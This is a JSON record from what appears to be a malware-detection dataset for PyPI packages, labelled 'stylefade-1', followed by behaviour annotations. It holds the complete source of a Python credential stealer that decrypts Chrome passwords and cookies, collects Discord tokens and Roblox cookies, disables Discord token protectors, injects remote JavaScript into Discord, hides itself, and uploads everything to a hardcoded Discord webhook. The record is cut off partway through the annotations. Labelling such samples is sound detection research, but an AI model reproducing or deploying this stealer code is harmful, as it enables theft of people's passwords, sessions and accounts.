{
  "metadata": {
    "package_name": "stylefade-1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/stylefade-1.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/stylefade-1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__main__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport json\nimport httpx\nimport ctypes\nimport shutil\nimport psutil\nimport asyncio\nimport sqlite3\nimport zipfile\nimport threading\nimport subprocess\n\nfrom sys import argv\nfrom base64 import b64decode\nfrom re import findall, match\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\n\nconfig = {\n    'webhook': \"https://discord.com/api/webhooks/1059250360717422632/9krzHX4GJ_KKKQgq_A3nUyq-VvFwJpcd0nL9rdtTlFa6oTVxAwJaMWXoz44LWsHv7E8R\",\n    'injection_url': \"https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js\",\n    'kill_discord': False,\n    'startup': False,\n    'hide_self': True\n}\n\nclass functions(object):\n    @staticmethod\n    def getHeaders(token: str = None):\n        headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n\n    @staticmethod\n    def get_master_key(path) -> str:\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n\n    @staticmethod\n    def decrypt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return \"Failed to decrypt password\"\n\n    @staticmethod\n    def config(e: str) -> str or bool | None:\n        return config.get(e)\n\nclass Hazard_Token_Grabber_V2(functions):\n    def __init__(self):\n        self.webhook = self.config('webhook')\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.temp = os.getenv(\"temp\")\n        self.startup = self.roaming + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n        self.dir = self.temp+\"\\\\Hazard_Token_Grabber_V2\"\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\"\n        try:\n            os.mkdir(os.path.join(self.dir))\n        except Exception:\n            pass\n        self.sep = os.sep\n        self.tokens = []\n        self.robloxcookies = []\n\n    def try_extract(func):\n        def wrapper(*args, **kwargs):\n            try:\n                func(*args, **kwargs)\n            except Exception:\n                pass\n        return wrapper\n\n    async def checkToken(self, tkn: str) -> str:\n        try:\n            r = httpx.get(\n                url=self.baseurl,\n                headers=self.getHeaders(tkn),\n                timeout=5.0\n            )\n        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):\n            pass\n        if r.status_code == 200 and tkn not in self.tokens:\n            self.tokens.append(tkn)\n\n    async def init(self):\n        await self.bypassBetterDiscord()\n        await self.bypassTokenProtector()\n        function_list = [self.screenshot, self.grabTokens,\n                         self.grabRobloxCookie]\n        if self.config('hide_self'):\n            function_list.append(self.hide)\n        if self.config('kill_discord'):\n            function_list.append(self.killDiscord)\n        if self.config('startup'):\n            function_list.append(self.startup)\n        if os.path.exists(self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Default') and os.path.exists(self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State'):\n            function_list.append(self.grabPassword)\n            function_list.append(self.grabCookies)\n        for func in function_list:\n            process = threading.Thread(target=func, daemon=True)\n            process.start()\n        for t in threading.enumerate():\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n        self.neatifyTokens()\n        await self.injector()\n        self.finish()\n        shutil.rmtree(self.dir)\n\n    def hide(self):\n        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)\n\n    def startup(self):\n        try:\n            shutil.copy2(argv[0], self.startup)\n        except Exception:\n            pass\n\n    async def injector(self):\n        for _dir in os.listdir(self.appdata):\n            if 'discord' in _dir.lower():\n                discord = self.appdata+self.sep+_dir\n                disc_sep = discord+self.sep\n                for __dir in os.listdir(os.path.abspath(discord)):\n                    if match(r'app-(\\d*\\.\\d*)*', __dir):\n                        app = os.path.abspath(disc_sep+__dir)\n                        inj_path = app+'\\\\modules\\\\discord_desktop_core-3\\\\discord_desktop_core\\\\'\n                        if os.path.exists(inj_path):\n                            if self.startup not in argv[0]:\n                                try:\n                                    os.makedirs(\n                                        inj_path+'initiation', exist_ok=True)\n                                except (FileExistsError, PermissionError):\n                                    pass\n                            f = httpx.get(self.config('injection_url')).text.replace(\n                                \"%WEBHOOK%\", self.webhook)\n                            with open(inj_path+'index.js', 'w', errors=\"ignore\") as indexFile:\n                                indexFile.write(f)\n                            os.startfile(app + self.sep + _dir + '.exe')\n\n    def killDiscord(self):\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in\n                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n\n    async def bypassTokenProtector(self):\n        tp = f\"{self.roaming}\\\\DiscordTokenProtector\\\\\"\n        config = tp+\"config.json\"\n        for i in [\"DiscordTokenProtector.exe\", \"ProtectionPayload.dll\", \"secure.dat\"]:\n            try:\n                os.remove(tp+i)\n            except FileNotFoundError:\n                pass\n        if os.path.exists(config):\n            with open(config, errors=\"ignore\") as f:\n                try:\n                    item = json.load(f)\n                except json.decoder.JSONDecodeError:\n                    return\n                item['Rdimo_just_shit_on_this_token_protector'] = \"https://github.com/Rdimo\"\n                item['auto_start'] = False\n                item['auto_start_discord'] = False\n                item['integrity'] = False\n                item['integrity_allowbetterdiscord'] = False\n                item['integrity_checkexecutable'] = False\n                item['integrity_checkhash'] = False\n                item['integrity_checkmodule'] = False\n                item['integrity_checkscripts'] = False\n                item['integrity_checkresource'] = False\n                item['integrity_redownloadhashes'] = False\n                item['iterations_iv'] = 364\n                item['iterations_key'] = 457\n                item['version'] = 69420\n            with open(config, 'w') as f:\n                json.dump(item, f, indent=2, sort_keys=True)\n            with open(config, 'a') as f:\n                f.write(\n                    \"\\n\\n//Rdimo just shit on this token protector | https://github.com/Rdimo\")\n\n    async def bypassBetterDiscord(self):\n        bd = self.roaming+\"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        if os.path.exists(bd):\n            x = \"api/webhooks\"\n            with open(bd, 'r', encoding=\"cp437\", errors='ignore') as f:\n                txt = f.read()\n                content = txt.replace(x, 'RdimoTheGoat')\n            with open(bd, 'w', newline='', encoding=\"cp437\", errors='ignore') as f:\n                f.write(content)\n\n    def getProductValues(self):\n        try:\n            wkey = subprocess.check_output(\n                r\"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\", creationflags=0x08000000).decode().rstrip()\n        except Exception:\n            wkey = \"N/A (Likely Pirated)\"\n        try:\n            productName = subprocess.check_output(\n                r\"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\", creationflags=0x08000000).decode().rstrip()\n        except Exception:\n            productName = \"N/A\"\n        return [productName, wkey]\n\n    @try_extract\n    def grabTokens(self):\n        paths = {\n            'Discord': self.roaming + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'\n        }\n        for _, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            if \"discord\" not in path:\n                for file_name in os.listdir(path):\n                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for regex in (self.regex):\n                            for token in findall(regex, line):\n                                asyncio.run(self.checkToken(token))\n            else:\n                if os.path.exists(self.roaming+'\\\\discord\\\\Local State'):\n                    for file_name in os.listdir(path):\n                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                            for y in findall(self.encrypted_regex, line):\n                                token = self.decrypt_val(b64decode(\n                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\\\discord\\\\Local State'))\n                                asyncio.run(self.checkToken(token))\n        if os.path.exists(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming+\"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for regex in (self.regex):\n                            for token in findall(regex, line):\n                                asyncio.run(self.checkToken(token))\n\n    @try_extract\n    def grabPassword(self):\n        master_key = self.get_master_key(\n            self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State')\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Login Data'\n        login = self.temp+self.sep+\"Loginvault1.db\"\n        shutil.copy2(login_db, login)\n        conn = sqlite3.connect(login)\n        cursor = conn.cursor()\n        with open(self.dir+\"\\\\Google Passwords.txt\", \"w\", encoding=\"cp437\", errors='ignore') as f:\n            cursor.execute(\n                \"SELECT action_url, username_value, password_value FROM logins\")\n            for r in cursor.fetchall():\n                url = r[0]\n                username = r[1]\n                encrypted_password = r[2]\n                decrypted_password = self.decrypt_val(\n                    encrypted_password, master_key)\n                if url != \"\":\n                    f.write(\n                        f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n\")\n        cursor.close()\n        conn.close()\n        os.remove(login)\n\n    @try_extract\n    def grabCookies(self):\n        master_key = self.get_master_key(\n            self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State')\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Network\\\\cookies'\n        login = self.temp+self.sep+\"Loginvault2.db\"\n        shutil.copy2(login_db, login)\n        conn = sqlite3.connect(login)\n        cursor = conn.cursor()\n        with open(self.dir+\"\\\\Google Cookies.txt\", \"w\", encoding=\"cp437\", errors='ignore') as f:\n            cursor.execute(\n                \"SELECT host_key, name, encrypted_value from cookies\")\n            for r in cursor.fetchall():\n                host = r[0]\n                user = r[1]\n                decrypted_cookie = self.decrypt_val(r[2], master_key)\n                if host != \"\":\n                    f.write(\n                        f\"Host: {host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\\n\")\n                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:\n                    self.robloxcookies.append(decrypted_cookie)\n        cursor.close()\n        conn.close()\n        os.remove(login)\n\n    def neatifyTokens(self):\n        f = open(self.dir+\"\\\\Discord Info.txt\",\n                 \"w\", encoding=\"cp437\", errors='ignore')\n        for token in self.tokens:\n            j = httpx.get(\n                self.baseurl, headers=self.getHeaders(token)).json()\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\n            badges = \"\"\n            flags = j['flags']\n            flags = j['flags']\n            if (flags == 1):\n                badges += \"Staff, \"\n            if (flags == 2):\n                badges += \"Partner, \"\n            if (flags == 4):\n                badges += \"Hypesquad Event, \"\n            if (flags == 8):\n                badges += \"Green Bughunter, \"\n            if (flags == 64):\n                badges += \"Hypesquad Bravery, \"\n            if (flags == 128):\n                badges += \"HypeSquad Brillance, \"\n            if (flags == 256):\n                badges += \"HypeSquad Balance, \"\n            if (flags == 512):\n                badges += \"Early Supporter, \"\n            if (flags == 16384):\n                badges += \"Gold BugHunter, \"\n            if (flags == 131072):\n                badges += \"Verified Bot Developer, \"\n            if (badges == \"\"):\n                badges = \"None\"\n            email = j.get(\"email\")\n            phone = j.get(\"phone\") if j.get(\n                \"phone\") else \"No Phone Number attached\"\n            nitro_data = httpx.get(\n                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()\n            has_nitro = False\n            has_nitro = bool(len(nitro_data) > 0)\n            billing = bool(len(json.loads(httpx.get(\n                self.baseurl+\"/billing/payment-sources\", headers=self.getHeaders(token)).text)) > 0)\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nToken: {token}\\nHas Billing: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nEmail: {email}\\nPhone: {phone}\\n\\n\")\n        f.close()\n\n    def grabRobloxCookie(self):\n        def subproc(path):\n            try:\n                return subprocess.check_output(\n                    fr\"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY\",\n                    creationflags=0x08000000).decode().rstrip()\n            except Exception:\n                return None\n        reg_cookie = subproc(r'HKLM')\n        if not reg_cookie:\n            reg_cookie = subproc(r'HKCU')\n        if reg_cookie:\n            self.robloxcookies.append(reg_cookie)\n        if self.robloxcookies:\n            with open(self.dir+\"\\\\Roblox Cookies.txt\", \"w\") as f:\n                for i in self.robloxcookies:\n                    f.write(i+'\\n')\n\n    def finish(self):\n        for i in os.listdir(self.dir):\n            if i.endswith('.txt'):\n                path = self.dir+self.sep+i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        try:\n                            os.remove(path)\n                        except PermissionError:\n                            pass\n                    with open(path, \"w\", encoding=\"utf-8\") as f:\n                        f.write(\n                            \"ðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n                    with open(path, \"a\", encoding=\"utf-8\") as fp:\n                        fp.write(\n                            x+\"\\n\\nðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2\")\n        w = self.getProductValues()\n        wname = w[0].replace(\" \", \"á Žâ€¯\")\n        wkey = w[1].replace(\" \", \"á Žâ€¯\")\n        ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(\".\")[0]\n        disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(\".\")[0]\n        data = httpx.get(\"https://ipinfo.io/json\").json()\n        ip = data.get('ip').replace(\" \", \"á Žâ€¯\")\n        city = data.get('city').replace(\" \", \"á Žâ€¯\")\n        country = data.get('country').replace(\" \", \"á Žâ€¯\")\n        region = data.get('region').replace(\" \", \"á Žâ€¯\")\n        org = data.get('org').replace(\" \", \"á Žâ€¯\")\n        googlemap = \"https://www.google.com/maps/search/google+map++\" + \\\n            data.get('loc')\n        _zipfile = os.path.join(\n            self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = os.path.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        files_found = ''\n        for f in os.listdir(self.dir):\n            files_found += f\"ãƒ»{f}\\n\"\n        tokens = ''\n        for tkn in self.tokens:\n            tokens += f'{tkn}\\n\\n'\n        fileCount = f\"{len(files)} Files Found: \"\n        embed = {\n            'username'\n            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',\n            'embeds': [\n                {\n                    'author': {\n                        'name': f'*{os.getlogin()}* Just ran Hazard Token Grabber.V2',\n                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',\n                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'\n                    },\n                    'color': 16119101,\n                    'description': f'[Google Maps Location]({googlemap})',\n                    'fields': [\n                        {\n                            'name': '\\u200b',\n                            'value': f'''```fix\n                                IP:á Žâ€¯{ip}\n                                Org:á Žâ€¯{org}\n                                City:á Žâ€¯{city}\n                                Region:á Žâ€¯{region}\n                                Country:á Žâ€¯{country}```\n                            '''.replace(' ', ''),\n                            'inline': True\n                        },\n                        {\n                            'name': '\\u200b',\n                            'value': f'''```fix\n                                PCName:â€¯{os.getenv('COMPUTERNAME').replace(\" \", \"á Žâ€¯\")}\n                                WinKey:á Žâ€¯{wkey}\n                                Platform:á Žâ€¯{wname}\n                                DiskSpace:á Žâ€¯{disk}GB\n                                Ram:á Žâ€¯{ram}GB```\n                            '''.replace(' ', ''),\n                            'inline': True\n                        },\n                        {\n                            'name': '**Tokens:**',\n                            'value': f'''```yaml\n                                {tokens if tokens else \"No tokens extracted\"}``` \n                            '''.replace(' ', ''),\n                            'inline': False\n                        },\n                        {\n                            'name': fileCount,\n                            'value': f'''```ini\n                                [\n                                {files_found.strip()}\n                                ]```\n                            '''.replace(' ', ''),\n                            'inline': False\n                        }\n                    ],\n                    'footer': {\n                        'text': 'ðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2'\n                    }\n                }\n            ]\n        }\n        httpx.post(self.webhook, json=embed)\n        with open(_zipfile, 'rb') as f:\n            httpx.post(self.webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(Hazard_Token_Grabber_V2().init())",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "localappdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "appdata",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "temp",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "os.path.join(self.dir)",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.appdata+'\\Google\\Chrome\\User Data\\Default'",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Determine browser profile presence",
              "intention_id": "determine_browser_profile_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.appdata+'\\Google\\Chrome\\User Data\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Determine_local_state_file_presence",
              "intention_id": "determine_local_state_file_presence"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=func, daemon=True",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "threading.Thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "threading.enumerate()",
              "action_description": "Lists all currently alive threads",
              "action_id": "list_threads",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "t.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "ctypes.windll.kernel32.SetFileAttributesW()",
              "action_description": "Sets file attributes for specified file",
              "action_id": "set_file_attributes",
              "object": "argv[0], 2",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "argv[0], self.startup",
              "object_description": "Executable file and startup path",
              "object_id": "executable_startup_path",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "self.appdata",
              "object_description": "User directory",
              "object_id": "user_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "discord",
              "object_description": "Discord local storage",
              "object_id": "discord_local_storage",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "inj_path",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "inj_path+'initiation', exist_ok=True",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.config('injection_url')",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "inj_path+'index.js', 'w', errors='ignore'",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "indexFile.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.startfile()",
              "action_description": "Opens file with associated application",
              "action_id": "open_file_app",
              "object": "app + self.sep + _dir + '.exe'",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "tp+i",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "config",
              "object_description": "System configuration file",
              "object_id": "system_config_file",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "config, errors='ignore'",
              "object_description": "System configuration file",
              "object_id": "system_config_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "json.load()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "config, 'w'",
              "object_description": "System configuration file",
              "object_id": "system_config_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "json.dump()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "item, f, indent=2, sort_keys=True",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "config, 'a'",
              "object_description": "System configuration file",
              "object_id": "system_config_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"\\n\\n//Rdimo just shit on this token protector | https://github.com/Rdimo\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "bd",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine_local_file_presence",
              "intention_id": "determine_local_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "bd, 'r', encoding='cp437', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "f.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
